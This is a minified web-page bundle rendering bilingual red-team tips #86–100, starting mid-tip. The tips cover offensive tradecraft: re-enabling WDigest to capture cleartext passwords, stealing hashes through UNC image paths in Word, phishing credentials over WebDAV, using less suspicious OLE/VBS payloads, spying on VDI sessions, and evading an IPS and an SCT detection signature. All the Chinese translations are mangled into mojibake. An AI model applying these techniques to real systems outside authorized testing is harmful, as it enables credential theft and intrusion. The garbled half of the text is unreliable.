åœ¨æŒä¹…æ§åˆ¶ç”¨æˆ·çš„è®¡ç®—æœºä¹‹å‰ï¼Œè¯·æ£€æŸ¥ç”¨æˆ·æ—¥å†ã€‚ä»–ä»¬å¯èƒ½ä¸åœ¨åŠå…¬å®¤ï¼Œæç ¸äº†ä½ çš„è®¡åˆ’ã€‚")]),e._v(" "),s("p",[e._v("Red tip #86: Red team and attack simulation is not penetration testing. You shouldnt be really testing anything, but simply infiltrating.\nçº¢è‰²æç¤ºï¼ƒ86: çº¢é˜Ÿå’Œæ”»å‡»æ¨¡æ‹Ÿä¸æ˜¯æ¸—é€æµ‹è¯•ã€‚ä½ ä¸åº”è¯¥çœŸçš„æµ‹è¯•ä»»ä½•ä¸œè¥¿ï¼Œåªæ˜¯ç®€å•çš„æ¸—é€ã€‚")]),e._v(" "),s("p",[e._v("Red tip #87: @Oddvarmoe uses .UDL files to quickly launch a MSSQL connection test to validate credentials!   https://blogs.msdn.microsoft.com/farukcelik/2007/12/31/basics-first-udl-test/\nçº¢è‰²æç¤ºï¼ƒ87:@Oddvarmoeä½¿ç”¨.udlæ–‡ä»¶å¿«é€Ÿå¯åŠ¨MSSQLè¿æ¥æµ‹è¯•ä»¥éªŒè¯å‡­æ®ï¼")]),e._v(" "),s("p",[e._v("Red tip #88: Dont forget Physical security! Whip up a PI with GSM and you can hack your way in by dropping the PI on network."),s("br"),e._v("\nRed tip #88: åˆ«å¿˜äº†ç‰©ç†å®‰å…¨ï¼ç”¨gsmåˆ›å»ºä¸€ä¸ªpiï¼Œä½ å¯ä»¥é€šè¿‡æŠŠæ ‘è“PIæ”¾åˆ°çº¢æ–¹ç½‘ç»œä¸Šæ¥ç ´è§£ã€‚")]),e._v(" "),s("p",[e._v("Red tip #89: regsvr32 SCT files are being detected as Squigglydoo. Looks for "),s("code",[e._v("script")]),e._v(" case sensitive and "),s("code",[e._v("<registration")]),e._v(" case insensitive."),s("br"),e._v("\nRed tip #89:  regsvr32 sctæ–‡ä»¶è¢«æ£€æµ‹ä¸ºsquigglydooã€‚æŸ¥æ‰¾"),s("code",[e._v("script")]),e._v("åŒºåˆ†å¤§å°å†™ä¸”"),s("code",[e._v("<registration")]),e._v(" åŒºåˆ†å¤§å°å†™ã€‚")]),e._v(" "),s("p",[e._v("Red tip #90: Cisco NGIPS is shit, when analysing traffic for havex it drops only "),s("code",[e._v("<havexhavex>")]),e._v(" but not "),s("code",[e._v("<havexDATABLOBhavex>")]),e._v(" Red tip #90:   æ€ç§‘NGIPSæ˜¯ç‹—å±ï¼Œå½“åˆ†æhavexçš„æµé‡æ—¶ï¼Œå®ƒåªä¼šä¸‹é™"),s("code",[e._v("<havexhavex>")]),e._v("è€Œä¸æ˜¯"),s("code",[e._v("<havexDATABLOBhavex>")])]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("p",[e._v("Havexç—…æ¯’è¿™ç§æ¶æ„è½¯ä»¶åœ¨æœ‰æ•ˆä¼ æ’­ä¹‹åå®Œå…¨æœ‰èƒ½åŠ›å®ç°ç¦ç”¨æ°´ç”µå¤§åã€ä½¿æ ¸ç”µç«™è¿‡è½½ã€ç”šè‡³æœ‰èƒ½åŠ›å…³é—­ä¸€ä¸ªåœ°åŒºå’Œå›½å®¶çš„ç”µç½‘è¿›è¡Œäº†åˆ†æï¼Œä»è€ŒæŒ‡å‡ºHavexæ ‡å¿—ç€å·¥æ§ç½‘ç»œå®‰å…¨å·²ç»è¿›å…¥APT2.0æ—¶ä»£ï¼Œ")])]),e._v(" "),s("h3",{attrs:{id:"_91-100"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_91-100","aria-hidden":"true"}},[e._v("#")]),e._v(" 91-100")]),e._v(" "),s("p",[e._v("Red tip #91: Decoys can be as simple as burning egress by port scanning 1-1024 through IDS, or spamming dodgy emails at blocks of employees"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #91: è¯±é¥µå¯ä»¥å¾ˆç®€å•ï¼Œä¾‹å¦‚æ‰«æ1-1024ç«¯å£å¹¶é€šè¿‡IDSåˆ¶é€ æ··ä¹±æˆ–åœ¨å‘˜å·¥ç¾¤ä¸­æ•£å‘é’“é±¼é‚®ä»¶")]),e._v(" "),s("p",[e._v("Red tip #92: If WDigest is disabled, reenable it for cleartext credentials before new users login with @harmj0y   https://github.com/HarmJ0y/Misc-PowerShell/blob/master/Invoke-WdigestDowngrade.ps1"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #92: å¦‚æœç¦ç”¨äº†WDigestï¼Œåˆ™åœ¨æ–°ç”¨æˆ·ä½¿ç”¨"),s("a",{attrs:{href:"https://github.com/HarmJ0y/Misc-PowerShell/blob/master/Invoke-WdigestDowngrade.ps1",target:"_blank",rel:"noopener noreferrer"}},[e._v("@harmj0y"),s("OutboundLink")],1),e._v("ç™»å½•ä¹‹å‰,é‡æ–°å¯ç”¨WDigestæ¥è·å–æ˜æ–‡å‡­è¯ã€‚")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[s("a",{attrs:{href:"https://www.4hou.com/info/news/8126.html",target:"_blank",rel:"noopener noreferrer"}},[e._v("WDigestï¼šæ¸…é™¤å†…å­˜ä¸­çš„å¯†ç "),s("OutboundLink")],1)])]),e._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("Explicitly sets Wdigest on a Windows 8.1/Server 2012 machine to use logon credentials.\nLocks the screen after so the user must retype their password.\n")])])])]),e._v(" "),s("p",[e._v("Red tip #93: Use Empyre to generate Macintosh and Linux payloads, modify it to contain code for Windows too!    https://github.com/EmpireProject/EmPyre"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #93: åˆ©ç”¨Empyreå¯ä»¥ç”ŸæˆMacintoshä»¥åŠLinuxç¯å¢ƒçš„è½½è·ï¼Œä¿®æ”¹åå¯ä»¥ç”¨äºwindowsç¯å¢ƒã€‚")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("p",[s("a",{attrs:{href:"https://www.freebuf.com/sectool/118715.html",target:"_blank",rel:"noopener noreferrer"}},[e._v("EmPyre"),s("OutboundLink")],1),e._v("æ˜¯ä¸€æ¬¾åŸºäºPythonï¼Œè¿œç¨‹å…¥ä¾µOSXç³»ç»Ÿçš„Post Exploitationæ¡†æ¶å·¥å…·ã€‚å®ƒå†…ç½®æœ‰OSXæ¼æ´åˆ©ç”¨æ¨¡å—ï¼Œä¸Metasploitç›¸æ¯”ï¼Œè®©äººè€³ç›®ä¸€æ–°ã€‚ "),s("a",{attrs:{href:"https://github.com/EmpireProject/EmPyre",target:"_blank",rel:"noopener noreferrer"}},[e._v("EmPyre githubåœ°å€"),s("OutboundLink")],1)])]),e._v(" "),s("p",[e._v("Red tip #94: Client uses VDIs? Compromise underlying host and use Citrix Shadow Taskbar to spy on VDI sessions by selecting username"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #94: ç”¨æˆ·ä½¿ç”¨äº†VDIsï¼ˆè™šæ‹Ÿæ¡Œé¢æ¶æ„ï¼‰ï¼Ÿæ”»é™·å®¿ä¸»(ç‰©ç†)ä¸»æœºå¹¶ä½¿ç”¨Citrix Shadow Taskbarç›‘è§†ä¸åŒç”¨æˆ·çš„VDIä¼šè¯ã€‚")]),e._v(" "),s("p",[e._v("Red tip #95: @domchell recommends avoiding non persistent VDIs and persist on laptops. Query DC for live laptops."),s("br"),e._v("\nçº¢é˜Ÿæç¤º #95:  @domchellå»ºè®®é¿å…ä½¿ç”¨éæŒä¹…æ€§VDIï¼Œå¹¶åœ¨ç¬”è®°æœ¬ç”µè„‘ä¸ŠæŒä¹…åŒ–ã€‚æŸ¥è¯¢DCå®æ—¶ç¬”è®°æœ¬ç”µè„‘ã€‚")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[e._v("ä¸è§£")])])]),e._v(" "),s("p",[e._v("Red tip #96: @lucasgates recommends using OLE objects containing VBS scripts instead of Macros as less suspicious. VBE will work too"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #96: @lucasgateså»ºè®®ä½¿ç”¨åŒ…å«VBSè„šæœ¬çš„OLEå¯¹è±¡è€Œä¸æ˜¯åŒ…å«å®çš„OLEå¯¹è±¡ï¼Œå› ä¸ºå®ƒä¸å¤ªå¯ç–‘ã€‚VBEä¹Ÿå°†å·¥ä½œã€‚")]),e._v(" "),s("p",[e._v("Red tip #97: Use recent critical vulnerabilities such as CVE-2017-0199 HTA handler issue to simulate real threats. https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #97: ä½¿ç”¨æœ€è¿‘çš„ä¸¥é‡æ¼æ´ï¼ˆä¾‹å¦‚CVE-2017-0199 HTAå¤„ç†ç¨‹åºé—®é¢˜ï¼‰æ¨¡æ‹ŸçœŸå®å¨èƒã€‚")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("p",[s("a",{attrs:{href:"https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/",target:"_blank",rel:"noopener noreferrer"}},[e._v("é“¾æ¥"),s("OutboundLink")],1)])]),e._v(" "),s("p",[e._v("Red tip #98: @0x09AL suggests WordSteal. You can embed an IMAGE with UNC path to steal hashes from Word. Wont work if proxy. https://github.com/0x09AL/WordSteal"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #98:  @0x09ALå»ºè®®ä½¿ç”¨WordStealã€‚æ‚¨å¯ä»¥å°†å›¾åƒä¸UNCè·¯å¾„ä¸€èµ·åµŒå…¥ï¼Œä»¥ä»Wordçªƒå–å“ˆå¸Œã€‚å¦‚æœä»£ç†ä¸èƒ½å·¥ä½œã€‚")]),e._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",{staticClass:"custom-block-title"},[e._v("TIP")]),e._v(" "),s("ul",[s("li",[s("a",{attrs:{href:"https://github.com/0x09AL/WordSteal",target:"_blank",rel:"noopener noreferrer"}},[e._v("WordSteal"),s("OutboundLink")],1)]),e._v(" "),s("li",[e._v("ä¸ # 55ç±»ä¼¼")])])]),e._v(" "),s("p",[e._v("Red tip #99: If client is using Proxy with WebDav you can phish creds using @ryHanson Phishery https://github.com/ryhanson/phishery"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #99:  å¦‚æœå®¢æˆ·ç«¯åˆ©ç”¨webdavä»£ç†ï¼Œå¯ä»¥ä½¿ç”¨"),s("a",{attrs:{href:"https://github.com/ryhanson/phishery",target:"_blank",rel:"noopener noreferrer"}},[e._v("@ryHanson Phishery"),s("OutboundLink")],1),e._v("é’“é±¼è·å–å‡­è¯")]),e._v(" "),s("p",[e._v("Red tip #100: Use wgsidav if you need a quick WebDav server ğŸ˜ƒ https://github.com/mar10/wsgidav"),s("br"),e._v("\nçº¢é˜Ÿæç¤º #100: å¦‚æœæƒ³è¦å¿«é€Ÿè·å–WebDavæœåŠ¡å™¨ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨"),s("a",{attrs:{href:"https://github.com/mar10/wsgidav",target:"_blank",rel:"noopener noreferrer"}},[e._v("wgsidav"),s("OutboundLink")],1)])])},[],!1,null,null,null);t.default=a.exports}}]);